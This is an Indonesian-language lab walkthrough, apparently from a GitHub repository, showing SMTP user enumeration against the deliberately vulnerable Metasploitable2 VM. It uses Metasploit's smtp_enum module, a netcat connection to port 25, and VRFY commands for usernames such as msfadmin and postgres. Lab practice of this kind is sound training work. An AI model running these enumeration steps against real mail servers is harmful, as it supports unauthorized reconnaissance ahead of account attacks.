# Exploit Port 25 (SMTP)
- Buka msfconsole di terminal
```sh
msfconsole
```

![alt text](https://github.com/rahardian-dwi-saputra/metasploitable2/blob/main/assets/exploit%20SMTP/smtp%201.JPG)

- Cari modul untuk enumerasi user SMTP
```sh
search smtp_enum
```

![alt text](https://github.com/rahardian-dwi-saputra/metasploitable2/blob/main/assets/exploit%20SMTP/smtp%202.JPG)

- Dari hasil pencarian hanya ditemukan 1 modul, jadi langsung kita gunakan modul tersebut
```sh
use 0
```

![alt text](https://github.com/rahardian-dwi-saputra/metasploitable2/blob/main/assets/exploit%20SMTP/smtp%203.JPG)

- Tampilkan daftar parameter yang dibutuhkan di modul tersebut. Disini semua parameter sudah terisi secara default kecuali parameter `RHOSTS`
```sh
show options
```

![alt text](https://github.com/rahardian-dwi-saputra/metasploitable2/blob/main/assets/exploit%20SMTP/smtp%204.JPG)

- Isi parameter `RHOST` dengan IP metasploitable2
```sh
set RHOST <IP_metasploitable2>
```

![alt text](https://github.com/rahardian-dwi-saputra/metasploitable2/blob/main/assets/exploit%20SMTP/smtp%205.JPG)

- Sebelum menjalankan exploit buka terminal baru dan jalankan netcat dengan listen port 25
```sh
nc <IP_metasploitable2> 25
```

![alt text](https://github.com/rahardian-dwi-saputra/metasploitable2/blob/main/assets/exploit%20SMTP/smtp%206.JPG)

- Jalankan modul tersebut
```sh
run
```

![alt text](https://github.com/rahardian-dwi-saputra/metasploitable2/blob/main/assets/exploit%20SMTP/smtp%207.JPG)

- Setelah netcat terhubung, verifikasi masing-masing user apakah dia terdaftar di SMTP server atau tidak. Jika statusnya reject maka user tersebut tidak terdaftar. Ketikkan quit untuk menghentikan `netcat`
```sh
VRFY mysql
VRFY daemon
VRFY postgresql
VRFY postgres
VRFY msfadmin
quit
```

![alt text](https://github.com/rahardian-dwi-saputra/metasploitable2/blob/main/assets/exploit%20SMTP/smtp%208.JPG)

- Modul berhasil dihentikan setelah netcat ditutup

![alt text](https://github.com/rahardian-dwi-saputra/metasploitable2/blob/main/assets/exploit%20SMTP/smtp%209.JPG)